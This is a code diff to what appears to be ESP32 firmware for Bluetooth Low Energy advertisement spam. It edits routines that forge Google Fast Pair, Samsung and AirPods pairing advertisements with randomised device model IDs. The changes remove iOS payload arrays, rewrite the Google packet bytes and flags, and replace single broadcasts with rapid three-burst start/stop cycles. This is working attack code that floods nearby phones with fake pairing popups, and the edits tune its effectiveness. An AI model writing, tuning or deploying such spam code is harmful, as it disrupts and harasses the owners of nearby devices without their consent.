@@ -31,9 +31,6 @@ enum EBLEPayloadType {
     AirPods_Pro_2 = 6
 };
 
-const uint8_t IOS1[] = {0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16};
-const uint8_t IOS2[] = {0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};
-
 struct DeviceType { uint32_t value; };
 struct WatchModel { uint8_t value; };
 
@@ -236,13 +233,12 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
         case Google: {
             uint32_t model = android_models[random(android_models_count)].value;
             uint8_t google[] = {
-                0x03, 0x03, 0x2C, 0xFE,
-                0x06, 0x16, 0x2C, 0xFE,
+                0x10, 0x16, 0x2C, 0xFE,
                 (uint8_t)((model >> 0x10) & 0xFF),
                 (uint8_t)((model >> 0x08) & 0xFF),
                 (uint8_t)((model >> 0x00) & 0xFF),
-                0x02, 0x0A,
-                (uint8_t)((random(120)) - 100)
+                0x64, 0x64, 0x20, 0x01,
+                0x00, 0x00, 0x00, 0x00
             };
             memcpy(packet, google, sizeof(google));
             packet_len = sizeof(google);
@@ -353,23 +349,19 @@ void executeAndroidFriendlySpam(EBLEPayloadType type) {
         pAdvertising->setMaxInterval(0x80);
     }
 
-    advertisementData.setFlags(0x06);
+    advertisementData.setFlags(0x1A);
     scanResponseData.setName(deviceName);
 
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->setScanResponseData(scanResponseData);
 
-    pAdvertising->start();
-    
-    if (type == Samsung) {
-        vTaskDelay(200 + random(0, 150) / portTICK_PERIOD_MS);
-    } else if (type == Google) {
-        vTaskDelay(300 + random(0, 200) / portTICK_PERIOD_MS);
-    } else {
-        vTaskDelay(180 / portTICK_PERIOD_MS);
+    for (int burst = 0; burst < 3; burst++) {
+        pAdvertising->start();
+        vTaskDelay(80 / portTICK_PERIOD_MS);
+        pAdvertising->stop();
+        if (burst < 2) vTaskDelay(40 / portTICK_PERIOD_MS);
     }
 
-    pAdvertising->stop();
     vTaskDelay(10 / portTICK_PERIOD_MS);
 
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
@@ -588,7 +580,7 @@ void aj_adv(int ble_choice) {
         }
         count++;
 
-        vTaskDelay(300 / portTICK_PERIOD_MS);
+        vTaskDelay(400 / portTICK_PERIOD_MS);
 
         if (check(EscPress)) {
             returnToMenu = true;
